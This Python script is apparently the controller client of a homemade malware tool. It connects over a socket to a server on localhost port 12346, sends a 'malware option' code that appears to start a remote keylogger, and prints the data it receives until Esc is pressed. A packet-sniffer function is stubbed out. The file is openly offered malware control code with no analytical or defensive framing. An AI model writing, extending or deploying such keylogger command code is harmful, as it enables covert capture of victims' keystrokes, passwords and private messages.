import threading
import socket
from pynput.keyboard import Key, Listener
import time

disconnect_socket = threading.Event()
started_keylogger = threading.Event()

def host():
    return 'localhost'

def port():
    return 12346

def make_blocked_socket():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return client_socket

def make_and_connect_blocked_socket_to_server():
    client_socket = make_blocked_socket()
    try:
        client_socket.connect((host(), port()))
        return client_socket
    except (socket.error, OSError) as e:
        print(f"Blocked socket connection failed: {e}")

def make_unblocked_socket():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.setblocking(0)  # Set the socket to non-blocking mode
    return client_socket

def make_and_connect_unblocked_socket_to_server():
    client_socket = make_unblocked_socket()
    try:
        client_socket.connect((host(), port()))
    except BlockingIOError:
        pass  # The socket is non-blocking, so it will raise an exception immediately
    return client_socket

def disconnect(client_socket):
    client_socket.close()

def send_to_server(socket, payload):
    socket.send(payload.encode('utf-8'))

def receive_from_server(socket):
    return socket.recv(1024).decode('utf-8')

def send_malware_option(socket, option):
    send_to_server(socket, option)

def keylogger(client_socket):
    time.sleep(1)
    send_malware_option(client_socket, '2')

    while not disconnect_socket.is_set():
        try:
            data = receive_from_server(client_socket)
            print(f"Received: {data}")
        except (BlockingIOError, ConnectionResetError, BrokenPipeError):
            pass

    print("Keylogger thread is stopping")
    return False

def on_kill(key):
    if key == Key.esc and started_keylogger.is_set():
        disconnect_socket.set()
        return False  # Stop the listener
    
def make_thread(target, args):
    return threading.Thread(target=target, args=(args,))

def make_keyboard_listener(on_release):
    return Listener(on_release=on_release)

def start_key_logger():
    client_unblocked_socket = make_and_connect_unblocked_socket_to_server()
    keylogger_thread = make_thread(keylogger, client_unblocked_socket)
    started_keylogger.set()
    keylogger_thread.start()

    with make_keyboard_listener(on_kill) as escape_key_listener:
        escape_key_listener.join()

    keylogger_thread.join()

    if disconnect_socket.is_set():
        disconnect_socket.clear()
        disconnect(client_unblocked_socket)  # Disconnect from the socket

def start_packet_sniffer():
    pass

def main():
    start_key_logger()

if __name__ == "__main__":
    main()
